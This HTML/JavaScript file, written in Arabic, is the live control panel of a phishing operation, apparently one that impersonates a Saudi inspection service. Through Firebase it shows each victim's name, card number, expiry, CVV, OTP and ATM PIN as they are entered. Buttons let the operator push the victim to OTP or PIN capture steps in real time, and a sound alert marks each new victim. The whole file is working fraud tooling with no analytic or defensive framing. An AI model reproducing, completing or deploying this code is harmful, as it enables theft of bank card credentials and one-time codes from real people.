<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>رادار العمليات الجديد - Engineer Hasan</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #e9ecef; margin: 0; padding: 20px; }
        .header { background: #006C35; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 10px; z-index: 1000; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .card { background: white; padding: 15px; margin-bottom: 12px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #006C35; display: grid; grid-template-columns: 2fr 2fr 1.5fr 1fr; gap: 15px; align-items: center; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        .data-val { font-weight: bold; color: #333; display: block; font-size: 15px; }
        .card-no { font-family: monospace; color: #d9534f; font-size: 18px; background: #fff5f5; padding: 4px; border-radius: 5px; }
        .status-badge { padding: 4px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; background: #eee; }
        .btn-action { padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-otp { background: #28a745; color: white; }
        .btn-pin { background: #ffc107; color: black; }
        .btn-del { background: #dc3545; color: white; }
    </style>
</head>
<body>

<div class="header">
    <div>
        <strong>لوحة التحكم اللحظية</strong> | <span id="online-now">0</span> زوار نشطين
    </div>
    <div id="status-msg" style="font-size: 13px; color: #00ff88;">جاري مراقبة البيانات الجديدة...</div>
</div>

<audio id="alert-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="logs-list">
    </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
        projectId: "saso-inspection"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const logsList = document.getElementById('logs-list');
    const alertSound = document.getElementById('alert-sound');

    // وظيفة لعرض أو تحديث الكارت في الصفحة
    function renderCard(id, data) {
        let existingCard = document.getElementById('card-' + id);
        const cardInfo = data.card_details || {};
        const userInfo = data.personal_info || {};
        
        const cardHTML = `
            <div class="info-sec">
                <span style="font-size: 10px; color: #888;">العميل</span>
                <span class="data-val">${userInfo.fullName || '---'}</span>
                <span class="status-badge">${data.current_page || 'Index'}</span>
            </div>
            <div class="info-sec">
                <span style="font-size: 10px; color: #888;">بيانات الدفع</span>
                <span class="card-no">${cardInfo.cardNumber || '**** **** **** ****'}</span>
                <small>${cardInfo.expiry || '--/--'} | CVV: ${cardInfo.cvv || '***'}</small>
            </div>
            <div class="info-sec" style="text-align: center;">
                <span style="font-size: 10px; color: #888;">الرموز</span>
                <span class="data-val" style="color: blue; font-size: 20px;">OTP: ${cardInfo.otp || '----'}</span>
                <span class="data-val" style="color: red;">PIN: ${cardInfo.atm_pin || '----'}</span>
            </div>
            <div style="display: flex; flex-direction: column; gap: 5px;">
                <button class="btn-action btn-otp" onclick="sendCmd('${id}', 'go_to_otp')">طلب OTP</button>
                <button class="btn-action btn-pin" onclick="sendCmd('${id}', 'go_to_pin')">طلب PIN</button>
                <button class="btn-action btn-del" onclick="deleteRec('${id}')">حذف</button>
            </div>
        `;

        if (existingCard) {
            existingCard.innerHTML = cardHTML; // تحديث الكارت إذا كان موجوداً
            existingCard.style.borderRightColor = "#ffc107"; // تمييز التحديث بلون أصفر مؤقت
            setTimeout(() => existingCard.style.borderRightColor = "#006C35", 2000);
        } else {
            const newCard = document.createElement('div');
            newCard.id = 'card-' + id;
            newCard.className = 'card';
            newCard.innerHTML = cardHTML;
            logsList.insertBefore(newCard, logsList.firstChild); // إضافة الجديد في الأعلى
            alertSound.play().catch(e=>{}); // صوت تنبيه للجديد
        }
    }

    // الاستماع للإضافات الجديدة فقط
    db.ref('orders').on('child_added', (snapshot) => {
        renderCard(snapshot.key, snapshot.val());
    });

    // الاستماع لأي تغيير في بيانات سجل موجود (مثل كتابة OTP)
    db.ref('orders').on('child_changed', (snapshot) => {
        renderCard(snapshot.key, snapshot.val());
    });

    // الاستماع للحذف
    db.ref('orders').on('child_removed', (snapshot) => {
        const el = document.getElementById('card-' + snapshot.key);
        if (el) el.remove();
    });

    function sendCmd(id, step) {
        db.ref('orders/' + id).update({ next_step: step, last_action: Date.now() });
    }

    function deleteRec(id) {
        if(confirm('حذف هذا السجل نهائياً؟')) db.ref('orders/' + id).remove();
    }

    // حساب الزوار (تحديث كل 10 ثواني)
    db.ref('live_sessions').on('value', (s) => {
        let c = 0; s.forEach(x => { if(Date.now() - x.val().last_seen < 30000) c++; });
        document.getElementById('online-now').innerText = c;
    });
</script>
</body>
</html>
